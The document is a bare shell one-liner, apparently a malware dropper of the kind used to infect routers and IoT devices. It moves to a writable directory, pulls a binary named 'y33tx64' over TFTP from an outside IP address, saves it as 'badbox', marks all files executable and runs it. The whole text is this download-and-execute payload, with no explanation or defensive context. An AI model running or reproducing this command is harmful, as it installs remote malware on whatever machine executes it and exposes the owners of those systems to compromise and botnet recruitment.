cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r y33tx64 -g 46.166.185.73;cat y33tx64 >badbox;chmod +x *;./badbox
